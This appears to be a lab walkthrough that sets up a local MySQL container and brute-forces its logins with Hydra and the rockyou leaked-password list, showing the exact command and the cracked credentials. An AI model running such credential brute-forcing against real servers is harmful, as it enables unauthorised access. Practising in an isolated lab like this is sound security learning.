---
layout: default
title: "Hydra Walkthrough"
---

# Hydra Walkthrough

Hydra basic walkthrough

## Installation

```bash
# Linux
apt-get install hydra

# MacOS
brew install hydra
```

Validate installation by running:

```bash
hydra -h
```

## Prepare attack target - MySQL database
### Create `init.sql`
```sql
-- Create additional users
CREATE USER 'user1'@'%' IDENTIFIED BY 'password12345';

-- Grant privileges
GRANT ALL PRIVILEGES ON db.* TO 'user1'@'%';

GRANT SELECT ON mysql.user TO 'user'@'%';


-- Flush privileges to ensure that all changes take effect
FLUSH PRIVILEGES;
```

### Create `docker-compose.yml`
```yaml
version: "3.8"

services:
  db:
    image: mysql:latest
    container_name: mysql_db
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword
      MYSQL_DATABASE: db
      MYSQL_USER: user
      MYSQL_PASSWORD: password
    volumes:
      - db_data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    ports:
      - "3306:3306"

volumes:
  db_data:
```

Run MySQL database in Docker container:

```bash
docker-compose up -d
```

Install MySQL client:

```bash
# Linux
apt-get install mysql-client

# MacOS
brew install mysql-client
```

Connect to MySQL database:

```bash
╰─ sudo mysql -h 127.0.0.1 -P 3306 -u user -p

Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.3.0 MySQL Community Server - GPL

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

List all user

```sql
SELECT User, Host FROM mysql.user;
```

You should see

```
+------------------+-----------+
| User             | Host      |
+------------------+-----------+
| root             | %         |
| user             | %         |
| user1            | %         |
| user2            | %         |
| mysql.infoschema | localhost |
| mysql.session    | localhost |
| mysql.sys        | localhost |
| root             | localhost |
+------------------+-----------+
8 rows in set (0.01 sec)
```

## Prepare attack data

Check usernames.txt file:

```txt
user
user1
user2
```

Download rockyou.txt dictionary:

```bash
#bin/sh

# Download rockyou.txt dictionary
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# Extract rockyou.txt dictionary
tar -xvf rockyou.txt.tar.gz

# Rename rockyou.txt to passwords.txt
mv rockyou.txt passwords.txt

# Remove rockyou.txt.tar.gz
rm rockyou.txt.tar.gz
```

```bash
# Download
./download_rockyou.txt
```

## Attack MySQL database

```bash
hydra -L usernames.txt -P passwords.txt -s 3306 localhost mysql
```

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-13 12:01:24
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 28688796 login tries (l:2/p:14344398), ~7172199 tries per task
[DATA] attacking mysql://localhost:3306/
```

### password

```bash
[3306][mysql] host: localhost   login: user   password: password
```

### password1234

```bash
[3306][mysql] host: localhost   login: user1   password: password12345
[STATUS] attack finished for localhost (waiting for children to complete tests)
1 of 1 target successfully completed, 2 valid passwords found
```
